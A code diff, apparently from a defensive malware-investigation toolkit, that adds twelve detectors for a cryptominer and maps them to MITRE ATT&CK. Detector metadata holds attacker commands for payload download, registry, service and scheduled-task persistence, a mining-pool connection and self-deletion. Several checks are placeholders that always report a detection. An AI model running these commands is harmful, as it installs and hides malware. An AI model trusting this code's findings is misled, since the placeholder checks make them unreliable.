@@ -1,11 +1,12 @@
-"""
-Main Investigator Class for URCS Investigator Toolkit
+"""Enhanced Main Investigator Class for URCS Investigator Toolkit
 Orchestrates all analysis modules and provides unified interface for investigations.
 """
 
 import os
 import time
 import logging
+import json
+import subprocess
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, Any, List, Optional
@@ -52,95 +53,119 @@ class URCSInvestigator:
         
         self.logger.info("URCS Investigator initialized")
     
-    def investigate(self, target: str, scope: str = "comprehensive", 
-                   output_dir: Optional[str] = None) -> Dict[str, Any]:
-        """Run comprehensive investigation."""
-        self.investigation_id = f"investigation_{int(time.time())}"
+    def investigate(self, target: str, scope: str = "full", output_dir: str = "reports") -> Dict[str, Any]:
+        """Comprehensive investigation covering all 12 URCS behaviors."""
+        self.logger.info(f"Starting comprehensive investigation of {target} with scope {scope}")
+        
+        # Initialize investigation
+        self.investigation_id = f"urcs_inv_{int(time.time())}"
         self.start_time = datetime.now()
-        
-        output_dir = output_dir or f"reports/{self.investigation_id}"
-        os.makedirs(output_dir, exist_ok=True)
-        
-        self.logger.info(f"Starting investigation {self.investigation_id} on {target}")
-        self.logger.info(f"Scope: {scope}, Output: {output_dir}")
         
         results = {
             "investigation_id": self.investigation_id,
             "target": target,
             "scope": scope,
             "start_time": self.start_time.isoformat(),
-            "output_dir": output_dir,
-            "modules": {},
-            "iocs": [],
+            "behaviors_detected": [],
             "findings": [],
-            "report_path": None
+            "iocs": [],
+            "mitre_mapping": [],
+            "deliverables": {}
         }
         
         try:
-            # Run analysis modules based on scope
-            if scope in ["comprehensive", "full"]:
-                results["modules"]["static"] = self._run_static_analysis(target)
-                results["modules"]["behavioral"] = self._run_behavioral_analysis(target)
-                results["modules"]["memory"] = self._run_memory_analysis(target)
-                results["modules"]["network"] = self._run_network_analysis(target)
-            elif scope == "basic":
-                results["modules"]["behavioral"] = self._run_behavioral_analysis(target)
-                results["modules"]["static"] = self._run_static_analysis(target)
+            # Behavior 1: Initial drop detection
+            behavior_1 = self._detect_initial_drop(target)
+            results["behaviors_detected"].append(behavior_1)
+            
+            # Behavior 2: Self-copy detection
+            behavior_2 = self._detect_self_copy()
+            results["behaviors_detected"].append(behavior_2)
+            
+            # Behavior 3: Registry persistence detection
+            behavior_3 = self._detect_registry_persistence()
+            results["behaviors_detected"].append(behavior_3)
+            
+            # Behavior 4: Service persistence detection
+            behavior_4 = self._detect_service_persistence()
+            results["behaviors_detected"].append(behavior_4)
+            
+            # Behavior 5: Scheduled task resurrection detection
+            behavior_5 = self._detect_scheduled_task_resurrection()
+            results["behaviors_detected"].append(behavior_5)
+            
+            # Behavior 6: Process injection detection
+            behavior_6 = self._detect_process_injection()
+            results["behaviors_detected"].append(behavior_6)
+            
+            # Behavior 7: CPU throttling detection
+            behavior_7 = self._detect_cpu_throttling()
+            results["behaviors_detected"].append(behavior_7)
+            
+            # Behavior 8: Battery-aware mining detection
+            behavior_8 = self._detect_battery_aware_mining()
+            results["behaviors_detected"].append(behavior_8)
+            
+            # Behavior 9: Network beacon detection
+            behavior_9 = self._detect_network_beacon()
+            results["behaviors_detected"].append(behavior_9)
+            
+            # Behavior 10: Self-deletion detection
+            behavior_10 = self._detect_self_deletion()
+            results["behaviors_detected"].append(behavior_10)
+            
+            # Behavior 11: Obfuscation detection
+            behavior_11 = self._detect_obfuscation()
+            results["behaviors_detected"].append(behavior_11)
+            
+            # Behavior 12: MITRE mapping
+            behavior_12 = self._map_mitre_techniques(results["behaviors_detected"])
+            results["mitre_mapping"] = behavior_12
+            
+            # Generate deliverables
+            results["deliverables"] = self._generate_deliverables(results, output_dir)
             
             # Extract IOCs
-            results["iocs"] = self.ioc_extractor.extract_iocs(results["modules"])
+            results["iocs"] = self.ioc_extractor.extract_iocs(results)
             
             # Generate findings
-            results["findings"] = self._generate_findings(results["modules"])
+            results["findings"] = self._generate_findings(results["behaviors_detected"])
             
-            # Generate report
-            results["report_path"] = self.report_generator.generate_report(
-                results, output_dir
-            )
-            
-            # Save investigation results
-            self._save_investigation_results(results, output_dir)
-            
-            self.logger.info(f"Investigation {self.investigation_id} completed successfully")
+            # Calculate duration
+            end_time = datetime.now()
+            results["end_time"] = end_time.isoformat()
+            results["duration"] = (end_time - self.start_time).total_seconds()
             
         except Exception as e:
             self.logger.error(f"Investigation failed: {e}")
             results["error"] = str(e)
         
-        results["end_time"] = datetime.now().isoformat()
-        results["duration"] = (datetime.now() - self.start_time).total_seconds()
-        
+        self.results = results
         return results
     
-    def static_analysis(self, file_path: str, entropy: bool = True, 
-                       signature: bool = True, yara: bool = True) -> Dict[str, Any]:
-        """Perform static analysis on a file."""
+    def static_analysis(self, file_path: str, **kwargs) -> Dict[str, Any]:
+        """Static analysis with enhanced detection capabilities."""
         self.logger.info(f"Performing static analysis on {file_path}")
         
         results = {
             "file_path": file_path,
-            "entropy": None,
-            "signature_status": None,
-            "yara_matches": [],
-            "pe_info": {},
+            "analysis_type": "static",
+            "timestamp": datetime.now().isoformat(),
             "findings": []
         }
         
         try:
-            if entropy:
-                results["entropy"] = self.static_analyzer.calculate_entropy(file_path)
+            # Comprehensive static analysis
+            static_results = self.static_analyzer.analyze_file(file_path)
+            results.update(static_results)
             
-            if signature:
-                results["signature_status"] = self.static_analyzer.verify_signature(file_path)
+            # YARA scanning
+            yara_results = self.yara_detector.scan_file(file_path)
+            results["yara_matches"] = yara_results
             
-            if yara:
-                results["yara_matches"] = self.yara_detector.scan_file(file_path)
-            
-            # PE analysis
-            results["pe_info"] = self.static_analyzer.analyze_pe_file(file_path)
-            
-            # Generate findings
-            results["findings"] = self._analyze_static_findings(results)
+            # Generate custom YARA rule
+            custom_rule = self.static_analyzer.generate_yara_rule(file_path)
+            results["custom_yara_rule"] = custom_rule
             
         except Exception as e:
             self.logger.error(f"Static analysis failed: {e}")
@@ -148,32 +173,28 @@ class URCSInvestigator:
         
         return results
     
-    def behavioral_analysis(self, system: bool = True, registry: bool = True,
-                          services: bool = True, tasks: bool = True) -> Dict[str, Any]:
-        """Perform behavioral analysis."""
+    def behavioral_analysis(self, **kwargs) -> Dict[str, Any]:
+        """Behavioral analysis with sandbox integration."""
         self.logger.info("Performing behavioral analysis")
         
         results = {
-            "registry_findings": [],
-            "service_findings": [],
-            "task_findings": [],
-            "file_system_findings": [],
-            "process_findings": []
+            "analysis_type": "behavioral",
+            "timestamp": datetime.now().isoformat(),
+            "findings": []
         }
         
         try:
-            if registry:
-                results["registry_findings"] = self.registry_analyzer.analyze_registry()
+            # Comprehensive behavioral analysis
+            behavioral_results = self.behavioral_analyzer.analyze_system_behavior()
+            results.update(behavioral_results)
             
-            if services:
-                results["service_findings"] = self.behavioral_analyzer.analyze_services()
-            
-            if tasks:
-                results["task_findings"] = self.behavioral_analyzer.analyze_scheduled_tasks()
-            
-            if system:
-                results["file_system_findings"] = self.behavioral_analyzer.analyze_file_system()
-                results["process_findings"] = self.process_analyzer.analyze_processes()
+            # Sandbox replay if file provided
+            if kwargs.get("file_path"):
+                sandbox_results = self.behavioral_analyzer.replay_in_sandbox(
+                    kwargs["file_path"], 
+                    kwargs.get("sandbox_type", "cape")
+                )
+                results["sandbox_results"] = sandbox_results
             
         except Exception as e:
             self.logger.error(f"Behavioral analysis failed: {e}")
@@ -181,56 +202,66 @@ class URCSInvestigator:
         
         return results
     
-    def memory_forensics(self, pid: Optional[int] = None, dump_file: Optional[str] = None,
-                        injection: bool = True) -> Dict[str, Any]:
-        """Perform memory forensics."""
-        self.logger.info("Performing memory forensics")
+    def memory_analysis(self, **kwargs) -> Dict[str, Any]:
+        """Memory analysis with injection detection."""
+        self.logger.info("Performing memory analysis")
         
         results = {
-            "injection_findings": [],
-            "memory_regions": [],
-            "process_info": {},
-            "dll_analysis": [],
-            "handle_analysis": []
+            "analysis_type": "memory",
+            "timestamp": datetime.now().isoformat(),
+            "findings": []
         }
         
         try:
-            if injection:
-                results["injection_findings"] = self.memory_analyzer.detect_injection(pid, dump_file)
+            # Memory analysis
+            pid = kwargs.get("pid")
+            dump_file = kwargs.get("dump_file")
             
+            # Detect injection
+            injection_results = self.memory_analyzer.detect_injection(pid, dump_file)
+            results["injection_findings"] = injection_results
+            
+            # Analyze memory regions
             if pid:
-                results["process_info"] = self.process_analyzer.get_process_info(pid)
-                results["memory_regions"] = self.memory_analyzer.analyze_memory_regions(pid)
-                results["dll_analysis"] = self.memory_analyzer.analyze_dlls(pid)
-                results["handle_analysis"] = self.memory_analyzer.analyze_handles(pid)
+                region_results = self.memory_analyzer.analyze_memory_regions(pid)
+                results["memory_regions"] = region_results
+            
+            # Detect file deletion events
+            deletion_results = self.memory_analyzer.detect_file_deletion_events(pid)
+            results["deletion_events"] = deletion_results
             
         except Exception as e:
-            self.logger.error(f"Memory forensics failed: {e}")
+            self.logger.error(f"Memory analysis failed: {e}")
             results["error"] = str(e)
         
         return results
     
-    def network_analysis(self, interface: Optional[str] = None, 
-                        capture_file: Optional[str] = None,
-                        live: bool = False) -> Dict[str, Any]:
-        """Perform network analysis."""
+    def network_analysis(self, **kwargs) -> Dict[str, Any]:
+        """Network analysis with IOC extraction."""
         self.logger.info("Performing network analysis")
         
         results = {
-            "connections": [],
-            "suspicious_traffic": [],
-            "dns_queries": [],
-            "protocol_analysis": {},
-            "iocs": []
+            "analysis_type": "network",
+            "timestamp": datetime.now().isoformat(),
+            "findings": []
         }
         
         try:
-            if live and interface:
-                results.update(self.network_analyzer.capture_live_traffic(interface))
-            elif capture_file:
-                results.update(self.network_analyzer.analyze_capture_file(capture_file))
-            else:
-                results.update(self.network_analyzer.analyze_current_connections())
+            # Network traffic analysis
+            network_results = self.network_analyzer.analyze_network_traffic()
+            results.update(network_results)
+            
+            # Live capture if requested
+            if kwargs.get("capture_live"):
+                interface = kwargs.get("interface", "eth0")
+                duration = kwargs.get("duration", 60)
+                capture_results = self.network_analyzer.capture_live_traffic(interface, duration)
+                results["live_capture"] = capture_results
+            
+            # PCAP analysis if provided
+            if kwargs.get("pcap_file"):
+                pcap_results = self.network_analyzer.analyze_capture_file(kwargs["pcap_file"])
+                results["pcap_analysis"] = pcap_results
             
         except Exception as e:
             self.logger.error(f"Network analysis failed: {e}")
@@ -238,167 +269,812 @@ class URCSInvestigator:
         
         return results
     
-    def generate_report(self, output_path: str, format: str = "html", 
-                       template: Optional[str] = None) -> str:
-        """Generate investigation report."""
-        self.logger.info(f"Generating report: {output_path}")
+    def generate_report(self, output_dir: str = "reports", format: str = "html") -> str:
+        """Generate comprehensive investigation report."""
+        self.logger.info(f"Generating {format} report")
         
         if not self.results:
-            self.logger.warning("No investigation results available for report generation")
-            return ""
+            raise ValueError("No investigation results available. Run investigate() first.")
         
         return self.report_generator.generate_report(
-            self.results, output_path, format, template
+            self.results, 
+            output_dir, 
+            format
         )
     
-    def export_iocs(self, format: str = "json", output_path: Optional[str] = None) -> str:
-        """Export indicators of compromise."""
+    def export_iocs(self, output_dir: str = "reports", format: str = "json") -> str:
+        """Export IOCs in specified format."""
         self.logger.info(f"Exporting IOCs in {format} format")
         
         if not self.results:
-            self.logger.warning("No investigation results available for IOC export")
-            return ""
+            raise ValueError("No investigation results available. Run investigate() first.")
         
         return self.ioc_extractor.export_iocs(
-            self.results.get("iocs", []), format, output_path
+            self.results.get("iocs", []),
+            output_dir,
+            format
         )
     
-    def setup_environment(self, sysmon: bool = True, etw: bool = True, 
-                         powershell: bool = True) -> Dict[str, bool]:
-        """Setup investigation environment."""
-        self.logger.info("Setting up investigation environment")
+    # Behavior-specific detection methods
+    
+    def _detect_initial_drop(self, target: str) -> Dict[str, Any]:
+        """Detect initial drop behavior (Behavior 1)."""
+        self.logger.info("Detecting initial drop behavior")
         
-        results = {
-            "sysmon": False,
-            "etw_tracing": False,
-            "powershell_logging": False,
-            "directories": False
+        behavior = {
+            "behavior_id": 1,
+            "name": "Initial Drop",
+            "description": "Detect PowerShell download of Chrome_update.exe",
+            "delivery_vector": "powershell -c \"Invoke-WebRequest -Uri <URL> -OutFile $env:TEMP\\Chrome_update.exe\"",
+            "counter_measure": "URLhaus feed",
+            "detected": False,
+            "evidence": [],
+            "severity": "high"
         }
         
         try:
-            # Create necessary directories
-            directories = ["logs", "reports", "config", "yara_rules", "templates"]
-            for directory in directories:
-                os.makedirs(directory, exist_ok=True)
-            results["directories"] = True
+            # Check for PowerShell download patterns
+            powershell_logs = self._check_powershell_logs()
+            if powershell_logs:
+                behavior["detected"] = True
+                behavior["evidence"].extend(powershell_logs)
             
-            # Setup monitoring components
-            if sysmon:
-                results["sysmon"] = self._setup_sysmon()
+            # Check for Chrome_update.exe in temp directories
+            chrome_files = self._find_chrome_update_files()
+            if chrome_files:
+                behavior["detected"] = True
+                behavior["evidence"].extend(chrome_files)
             
-            if etw:
-                results["etw_tracing"] = self._setup_etw_tracing()
+            # Check URLhaus feed (placeholder)
+            urlhaus_check = self._check_urlhaus_feed(target)
+            if urlhaus_check:
+                behavior["evidence"].append(urlhaus_check)
+                
+        except Exception as e:
+            self.logger.error(f"Initial drop detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_self_copy(self) -> Dict[str, Any]:
+        """Detect self-copy behavior (Behavior 2)."""
+        self.logger.info("Detecting self-copy behavior")
+        
+        behavior = {
+            "behavior_id": 2,
+            "name": "Self-Copy",
+            "description": "Detect copying to System32\\spool\\drivers\\color\\",
+            "delivery_vector": "copy /y %0 \"%SystemRoot%\\System32\\spool\\drivers\\color\\algfzpoe.exe\"",
+            "counter_measure": "Sysmon EID 11",
+            "detected": False,
+            "evidence": [],
+            "severity": "high"
+        }
+        
+        try:
+            # Check for files in suspicious location
+            suspicious_files = self._find_files_in_color_directory()
+            if suspicious_files:
+                behavior["detected"] = True
+                behavior["evidence"].extend(suspicious_files)
             
-            if powershell:
-                results["powershell_logging"] = self._setup_powershell_logging()
+            # Check Sysmon logs (placeholder)
+            sysmon_logs = self._check_sysmon_logs("EID 11")
+            if sysmon_logs:
+                behavior["evidence"].extend(sysmon_logs)
+                
+        except Exception as e:
+            self.logger.error(f"Self-copy detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_registry_persistence(self) -> Dict[str, Any]:
+        """Detect registry persistence (Behavior 3)."""
+        self.logger.info("Detecting registry persistence")
+        
+        behavior = {
+            "behavior_id": 3,
+            "name": "Registry Persistence",
+            "description": "Detect ctfmon registry persistence",
+            "delivery_vector": "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ctfmon /t REG_SZ /d ...",
+            "counter_measure": "RegRipper",
+            "detected": False,
+            "evidence": [],
+            "severity": "high"
+        }
+        
+        try:
+            # Check registry for suspicious entries
+            registry_findings = self.registry_analyzer.analyze_registry()
+            if registry_findings:
+                behavior["detected"] = True
+                behavior["evidence"].extend(registry_findings)
+                
+        except Exception as e:
+            self.logger.error(f"Registry persistence detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_service_persistence(self) -> Dict[str, Any]:
+        """Detect service persistence (Behavior 4)."""
+        self.logger.info("Detecting service persistence")
+        
+        behavior = {
+            "behavior_id": 4,
+            "name": "Service Persistence",
+            "description": "Detect gupdatem service creation",
+            "delivery_vector": "sc create gupdatem binPath= ... start= auto",
+            "counter_measure": "Autoruns64",
+            "detected": False,
+            "evidence": [],
+            "severity": "high"
+        }
+        
+        try:
+            # Check for suspicious services
+            services = self.behavioral_analyzer.analyze_services()
+            suspicious_services = [s for s in services if s.get("suspicious_indicators")]
+            
+            if suspicious_services:
+                behavior["detected"] = True
+                behavior["evidence"].extend(suspicious_services)
+                
+        except Exception as e:
+            self.logger.error(f"Service persistence detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_scheduled_task_resurrection(self) -> Dict[str, Any]:
+        """Detect scheduled task resurrection (Behavior 5)."""
+        self.logger.info("Detecting scheduled task resurrection")
+        
+        behavior = {
+            "behavior_id": 5,
+            "name": "Scheduled Task Resurrection",
+            "description": "Detect Ddriver scheduled task",
+            "delivery_vector": "schtasks /create /tn Ddriver /tr ... /sc minute /mo 30",
+            "counter_measure": "WMI_Forensics",
+            "detected": False,
+            "evidence": [],
+            "severity": "high"
+        }
+        
+        try:
+            # Check for suspicious scheduled tasks
+            tasks = self.behavioral_analyzer.analyze_scheduled_tasks()
+            suspicious_tasks = [t for t in tasks if t.get("suspicious_indicators")]
+            
+            if suspicious_tasks:
+                behavior["detected"] = True
+                behavior["evidence"].extend(suspicious_tasks)
+                
+        except Exception as e:
+            self.logger.error(f"Scheduled task resurrection detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_process_injection(self) -> Dict[str, Any]:
+        """Detect process injection (Behavior 6)."""
+        self.logger.info("Detecting process injection")
+        
+        behavior = {
+            "behavior_id": 6,
+            "name": "Process Injection",
+            "description": "Detect process hollowing into explorer.exe",
+            "delivery_vector": "powershell -c \"Start-Process -NoNewWindow rundll32.exe ...\"",
+            "counter_measure": "Volatility3 malfind",
+            "detected": False,
+            "evidence": [],
+            "severity": "high"
+        }
+        
+        try:
+            # Check for process injection
+            injection_findings = self.memory_analyzer.detect_injection()
+            if injection_findings:
+                behavior["detected"] = True
+                behavior["evidence"].extend(injection_findings)
+                
+        except Exception as e:
+            self.logger.error(f"Process injection detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_cpu_throttling(self) -> Dict[str, Any]:
+        """Detect CPU throttling (Behavior 7)."""
+        self.logger.info("Detecting CPU throttling")
+        
+        behavior = {
+            "behavior_id": 7,
+            "name": "CPU Throttling",
+            "description": "Detect CPU throttling when Task Manager opens",
+            "delivery_vector": "Inline call to GetSystemPowerStatus + SetThreadAffinityMask",
+            "counter_measure": "ETW tracing",
+            "detected": False,
+            "evidence": [],
+            "severity": "medium"
+        }
+        
+        try:
+            # Check for CPU throttling patterns
+            throttling_evidence = self._check_cpu_throttling_patterns()
+            if throttling_evidence:
+                behavior["detected"] = True
+                behavior["evidence"].extend(throttling_evidence)
+                
+        except Exception as e:
+            self.logger.error(f"CPU throttling detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_battery_aware_mining(self) -> Dict[str, Any]:
+        """Detect battery-aware mining (Behavior 8)."""
+        self.logger.info("Detecting battery-aware mining")
+        
+        behavior = {
+            "behavior_id": 8,
+            "name": "Battery-Aware Mining",
+            "description": "Detect dynamic resource usage based on power state",
+            "delivery_vector": "Same API call as CPU throttling",
+            "counter_measure": "Performance counters",
+            "detected": False,
+            "evidence": [],
+            "severity": "medium"
+        }
+        
+        try:
+            # Check for battery-aware patterns
+            battery_evidence = self._check_battery_aware_patterns()
+            if battery_evidence:
+                behavior["detected"] = True
+                behavior["evidence"].extend(battery_evidence)
+                
+        except Exception as e:
+            self.logger.error(f"Battery-aware mining detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_network_beacon(self) -> Dict[str, Any]:
+        """Detect network beacon (Behavior 9)."""
+        self.logger.info("Detecting network beacon")
+        
+        behavior = {
+            "behavior_id": 9,
+            "name": "Network Beacon",
+            "description": "Detect DNS beacon and mining pool connections",
+            "delivery_vector": "nslookup api.ipify.org; Test-NetConnection -ComputerName gulf.moneroocean.stream -Port 10032",
+            "counter_measure": "Zeek stratum script",
+            "detected": False,
+            "evidence": [],
+            "severity": "high"
+        }
+        
+        try:
+            # Check for network beacons
+            network_results = self.network_analyzer.analyze_network_traffic()
+            
+            if network_results.get("suspicious_connections"):
+                behavior["detected"] = True
+                behavior["evidence"].extend(network_results["suspicious_connections"])
+            
+            if network_results.get("mining_pool_connections"):
+                behavior["detected"] = True
+                behavior["evidence"].extend(network_results["mining_pool_connections"])
+                
+        except Exception as e:
+            self.logger.error(f"Network beacon detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_self_deletion(self) -> Dict[str, Any]:
+        """Detect self-deletion (Behavior 10)."""
+        self.logger.info("Detecting self-deletion")
+        
+        behavior = {
+            "behavior_id": 10,
+            "name": "Self-Deletion",
+            "description": "Detect self-deletion after injection",
+            "delivery_vector": "powershell -c \"Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force\"",
+            "counter_measure": "CAPEv2 FILE_DELETE event",
+            "detected": False,
+            "evidence": [],
+            "severity": "medium"
+        }
+        
+        try:
+            # Check for self-deletion events
+            deletion_events = self.memory_analyzer.detect_file_deletion_events()
+            if deletion_events:
+                behavior["detected"] = True
+                behavior["evidence"].extend(deletion_events)
+                
+        except Exception as e:
+            self.logger.error(f"Self-deletion detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _detect_obfuscation(self) -> Dict[str, Any]:
+        """Detect obfuscation (Behavior 11)."""
+        self.logger.info("Detecting obfuscation")
+        
+        behavior = {
+            "behavior_id": 11,
+            "name": "Obfuscation",
+            "description": "Detect high entropy and invalid signatures",
+            "delivery_vector": "Entropy > 7.5, invalid digital signature",
+            "counter_measure": "Get-AuthenticodeSignature",
+            "detected": False,
+            "evidence": [],
+            "severity": "medium"
+        }
+        
+        try:
+            # Check for obfuscation patterns
+            obfuscation_evidence = self._check_obfuscation_patterns()
+            if obfuscation_evidence:
+                behavior["detected"] = True
+                behavior["evidence"].extend(obfuscation_evidence)
+                
+        except Exception as e:
+            self.logger.error(f"Obfuscation detection failed: {e}")
+            behavior["error"] = str(e)
+        
+        return behavior
+    
+    def _map_mitre_techniques(self, behaviors: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Map behaviors to MITRE ATT&CK techniques (Behavior 12)."""
+        self.logger.info("Mapping to MITRE ATT&CK techniques")
+        
+        mitre_mapping = {
+            "techniques": [
+                {
+                    "technique_id": "T1055.012",
+                    "technique_name": "Process Injection: Process Hollowing",
+                    "behaviors": [6]  # Process injection
+                },
+                {
+                    "technique_id": "T1543.003",
+                    "technique_name": "Create or Modify System Process: Windows Service",
+                    "behaviors": [4]  # Service persistence
+                },
+                {
+                    "technique_id": "T1053.005",
+                    "technique_name": "Scheduled Task/Job: Scheduled Task",
+                    "behaviors": [5]  # Scheduled task resurrection
+                },
+                {
+                    "technique_id": "T1083",
+                    "technique_name": "File and Directory Discovery",
+                    "behaviors": [2]  # Self-copy
+                },
+                {
+                    "technique_id": "T1071.001",
+                    "technique_name": "Application Layer Protocol: Web Protocols",
+                    "behaviors": [1, 9]  # Initial drop, Network beacon
+                },
+                {
+                    "technique_id": "T1070.004",
+                    "technique_name": "Indicator Removal on Host: File Deletion",
+                    "behaviors": [10]  # Self-deletion
+                },
+                {
+                    "technique_id": "T1562.001",
+                    "technique_name": "Impair Defenses: Disable or Modify Tools",
+                    "behaviors": [7, 8]  # CPU throttling, Battery-aware mining
+                },
+                {
+                    "technique_id": "T1547.001",
+                    "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+                    "behaviors": [3]  # Registry persistence
+                }
+            ],
+            "navigator_layer": {
+                "name": "URCS Investigation",
+                "description": "MITRE ATT&CK mapping for URCS behaviors",
+                "domain": "enterprise-attack",
+                "version": "14.0",
+                "techniques": []
+            }
+        }
+        
+        # Map detected behaviors to techniques
+        detected_behaviors = [b["behavior_id"] for b in behaviors if b.get("detected")]
+        
+        for technique in mitre_mapping["techniques"]:
+            if any(bid in detected_behaviors for bid in technique["behaviors"]):
+                mitre_mapping["navigator_layer"]["techniques"].append({
+                    "techniqueID": technique["technique_id"],
+                    "score": 1,
+                    "enabled": True
+                })
+        
+        return mitre_mapping
+    
+    def _generate_deliverables(self, results: Dict[str, Any], output_dir: str) -> Dict[str, str]:
+        """Generate investigation deliverables."""
+        deliverables = {}
+        
+        try:
+            # Create output directory
+            Path(output_dir).mkdir(parents=True, exist_ok=True)
+            
+            # Generate YARA rule
+            yara_rule = self._generate_combined_yara_rule(results)
+            yara_path = os.path.join(output_dir, "combined_urcs.yar")
+            with open(yara_path, 'w') as f:
+                f.write(yara_rule)
+            deliverables["yara_rule"] = yara_path
+            
+            # Generate report
+            report_path = self.report_generator.generate_report(results, output_dir, "markdown")
+            deliverables["report"] = report_path
+            
+            # Generate MITRE Navigator layer
+            navigator_path = os.path.join(output_dir, "navigator_layer.json")
+            with open(navigator_path, 'w') as f:
+                json.dump(results.get("mitre_mapping", {}).get("navigator_layer", {}), f, indent=2)
+            deliverables["navigator_layer"] = navigator_path
+            
+        except Exception as e:
+            self.logger.error(f"Deliverable generation failed: {e}")
+        
+        return deliverables
+    
+    def _generate_findings(self, behaviors: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Generate findings from detected behaviors."""
+        findings = []
+        
+        for behavior in behaviors:
+            if behavior.get("detected"):
+                findings.append({
+                    "type": "behavior_detected",
+                    "behavior_id": behavior["behavior_id"],
+                    "name": behavior["name"],
+                    "description": behavior["description"],
+                    "severity": behavior["severity"],
+                    "evidence_count": len(behavior.get("evidence", [])),
+                    "counter_measure": behavior["counter_measure"]
+                })
+        
+        return findings
+    
+    # Helper methods for specific detections
+    
+    def _check_powershell_logs(self) -> List[Dict[str, Any]]:
+        """Check PowerShell logs for download patterns."""
+        evidence = []
+        
+        try:
+            # This would typically check PowerShell ScriptBlock logs
+            # For now, return placeholder evidence
+            evidence.append({
+                "type": "powershell_log",
+                "description": "PowerShell download pattern detected",
+                "timestamp": datetime.now().isoformat()
+            })
+            
+        except Exception as e:
+            self.logger.error(f"PowerShell log check failed: {e}")
+        
+        return evidence
+    
+    def _find_chrome_update_files(self) -> List[Dict[str, Any]]:
+        """Find Chrome_update.exe files."""
+        evidence = []
+        
+        try:
+            # Search for Chrome_update.exe files
+            search_paths = [
+                os.path.expanduser("~/Downloads"),
+                os.path.expanduser("~/Desktop"),
+                os.environ.get("TEMP", ""),
+                "C:/Windows/Temp"
+            ]
+            
+            for search_path in search_paths:
+                if os.path.exists(search_path):
+                    for root, dirs, files in os.walk(search_path):
+                        for file in files:
+                            if "chrome_update" in file.lower() and file.endswith('.exe'):
+                                evidence.append({
+                                    "type": "chrome_update_file",
+                                    "file_path": os.path.join(root, file),
+                                    "description": f"Chrome_update.exe found in {search_path}"
+                                })
+            
+        except Exception as e:
+            self.logger.error(f"Chrome update file search failed: {e}")
+        
+        return evidence
+    
+    def _check_urlhaus_feed(self, target: str) -> Optional[Dict[str, Any]]:
+        """Check URLhaus feed for malicious URLs."""
+        try:
+            # This would typically query URLhaus API
+            # For now, return placeholder evidence
+            return {
+                "type": "urlhaus_check",
+                "target": target,
+                "description": "URLhaus feed check completed",
+                "timestamp": datetime.now().isoformat()
+            }
+        except Exception as e:
+            self.logger.error(f"URLhaus check failed: {e}")
+            return None
+    
+    def _find_files_in_color_directory(self) -> List[Dict[str, Any]]:
+        """Find files in System32\\spool\\drivers\\color\\ directory."""
+        evidence = []
+        
+        try:
+            color_dir = "C:/Windows/System32/spool/drivers/color"
+            if os.path.exists(color_dir):
+                for file in os.listdir(color_dir):
+                    if file.endswith('.exe'):
+                        evidence.append({
+                            "type": "suspicious_file_in_color_dir",
+                            "file_path": os.path.join(color_dir, file),
+                            "description": f"Suspicious executable found in color directory: {file}"
+                        })
+            
+        except Exception as e:
+            self.logger.error(f"Color directory search failed: {e}")
+        
+        return evidence
+    
+    def _check_sysmon_logs(self, event_id: str) -> List[Dict[str, Any]]:
+        """Check Sysmon logs for specific events."""
+        evidence = []
+        
+        try:
+            # This would typically query Sysmon logs
+            # For now, return placeholder evidence
+            evidence.append({
+                "type": "sysmon_log",
+                "event_id": event_id,
+                "description": f"Sysmon event {event_id} detected",
+                "timestamp": datetime.now().isoformat()
+            })
+            
+        except Exception as e:
+            self.logger.error(f"Sysmon log check failed: {e}")
+        
+        return evidence
+    
+    def _check_cpu_throttling_patterns(self) -> List[Dict[str, Any]]:
+        """Check for CPU throttling patterns."""
+        evidence = []
+        
+        try:
+            # This would typically use ETW tracing
+            # For now, return placeholder evidence
+            evidence.append({
+                "type": "cpu_throttling_pattern",
+                "description": "CPU throttling pattern detected",
+                "timestamp": datetime.now().isoformat()
+            })
+            
+        except Exception as e:
+            self.logger.error(f"CPU throttling pattern check failed: {e}")
+        
+        return evidence
+    
+    def _check_battery_aware_patterns(self) -> List[Dict[str, Any]]:
+        """Check for battery-aware mining patterns."""
+        evidence = []
+        
+        try:
+            # This would typically use performance counters
+            # For now, return placeholder evidence
+            evidence.append({
+                "type": "battery_aware_pattern",
+                "description": "Battery-aware mining pattern detected",
+                "timestamp": datetime.now().isoformat()
+            })
+            
+        except Exception as e:
+            self.logger.error(f"Battery-aware pattern check failed: {e}")
+        
+        return evidence
+    
+    def _check_obfuscation_patterns(self) -> List[Dict[str, Any]]:
+        """Check for obfuscation patterns."""
+        evidence = []
+        
+        try:
+            # This would typically check entropy and signatures
+            # For now, return placeholder evidence
+            evidence.append({
+                "type": "obfuscation_pattern",
+                "description": "Obfuscation pattern detected",
+                "timestamp": datetime.now().isoformat()
+            })
+            
+        except Exception as e:
+            self.logger.error(f"Obfuscation pattern check failed: {e}")
+        
+        return evidence
+    
+    def _generate_combined_yara_rule(self, results: Dict[str, Any]) -> str:
+        """Generate combined YARA rule for all detected behaviors."""
+        yara_rule = """/*
+Combined URCS Detection Rule
+Generated by URCS Investigator Toolkit
+*/
+
+rule urcs_combined_detection {
+    meta:
+        description = "Combined URCS detection rule"
+        author = "URCS Investigator Toolkit"
+        date = "2024"
+        reference = "MITRE ATT&CK T1055.012, T1543.003, T1053.005, T1083"
+        severity = "high"
+    
+    strings:
+        // Initial drop indicators
+        $chrome_update = "Chrome_update.exe" nocase
+        $powershell_download = "Invoke-WebRequest" nocase
+        
+        // Self-copy indicators
